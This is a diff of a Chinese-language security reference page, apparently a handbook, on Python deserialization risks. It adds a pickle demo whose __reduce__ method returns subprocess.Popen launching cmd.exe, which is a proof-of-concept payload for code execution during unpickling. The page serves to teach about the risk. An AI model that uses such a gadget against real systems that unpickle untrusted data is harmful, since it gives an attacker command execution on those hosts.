@@ -1,22 +1,28 @@
 反序列化
---------------------------------
+========================================
 
-pickle
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+pickle demo
+----------------------------------------
+Python Pickle在反序列化时会调用 ``__reduce__`` ，可用自定义的 ``__reduce__`` 函数来实现攻击。
 
-::
+.. code-block:: python
 
-    >>> class A(object):
-    ...     a = 1
-    ...     b = 2
-    ...     def __reduce__(self):
-    ...         return (subprocess.Popen, (('cmd.exe',),))
-    ...
-    >>> cPickle.dumps(A())
-    "csubprocess\nPopen\np1\n((S'cmd.exe'\np2\ntp3\ntp4\nRp5\n."
+    import pickle
+    import pickletools
+    import subprocess
 
-其他
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    class A(object):
+        a = 1
+        b = 2
+        def __reduce__(self):
+            return (subprocess.Popen, (('cmd.exe',),))
+
+    data = pickle.dumps(A())
+    pickletools.dis(data)
+
+
+其他序列化库
+----------------------------------------
 - PyYAML
 - marshal
 - shelve
